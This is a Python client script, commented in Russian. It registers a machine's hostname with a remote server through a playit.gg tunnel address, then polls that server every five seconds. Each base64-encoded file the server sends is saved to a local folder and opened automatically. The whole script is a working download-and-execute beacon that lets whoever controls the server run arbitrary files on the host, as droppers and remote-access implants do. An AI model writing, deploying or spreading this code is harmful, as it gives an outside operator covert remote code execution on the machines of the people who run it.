import requests
import uuid
import socket
import time
import os
import platform
import subprocess
import base64

# URL сервера (замените на playit.gg tunnel URL, например, http://XX.ip.gl.ply.gg:47XXX)
SERVER_URL = "super-severe.gl.at.ply.gg:24171"  # Укажите здесь ваш playit.gg URL
DOWNLOAD_DIR = os.path.join(os.path.dirname(__file__), "tempfiles")

def register_client(client_id, client_name):
    try:
        response = requests.post(
            f"{SERVER_URL}/api/register",
            json={"client_id": client_id, "client_name": client_name}
        )
        return response.status_code == 200
    except Exception as e:
        print(f"Error registering client: {e}")
        return False

def check_for_file(client_id):
    try:
        response = requests.get(f"{SERVER_URL}/api/check/{client_id}")
        if response.status_code == 200:
            data = response.json()
            return data.get("file")
    except Exception as e:
        print(f"Error checking for file: {e}")
    return None

def download_and_open_file(file_data, retries=3, delay=5):
    for attempt in range(retries):
        try:
            # Создаем папку для загрузки, если не существует
            if not os.path.exists(DOWNLOAD_DIR):
                os.makedirs(DOWNLOAD_DIR)

            # Декодируем base64
            filename = file_data["filename"]
            file_content = base64.b64decode(file_data["content"])
            file_path = os.path.join(DOWNLOAD_DIR, filename)

            # Сохраняем файл
            with open(file_path, 'wb') as f:
                f.write(file_content)

            # Открываем файл
            if platform.system() == "Windows":
                os.startfile(file_path)
            else:
                subprocess.run(["xdg-open", file_path] if platform.system() == "Linux" else ["open", file_path])
            return  # Успешно, выходим из функции

        except Exception as e:
            print(f"Attempt {attempt + 1} failed: {e}")
            if attempt < retries - 1:
                print(f"Retrying in {delay} seconds...")
                time.sleep(delay)
    print(f"Failed to process file after {retries} attempts")

def main():
    client_id = str(uuid.uuid4())
    client_name = socket.gethostname()
    print(f"Client ID: {client_id}, Name: {client_name}")

    # Регистрируем клиента
    if not register_client(client_id, client_name):
        print("Failed to register client")
        return

    print("Client registered, waiting for files...")
    while True:
        file_data = check_for_file(client_id)
        if file_data and "filename" in file_data and "content" in file_data:
            print(f"Received file to download: {file_data['filename']}")
            download_and_open_file(file_data)
        time.sleep(5)  # Проверяем каждые 5 секунд

if __name__ == "__main__":
    main()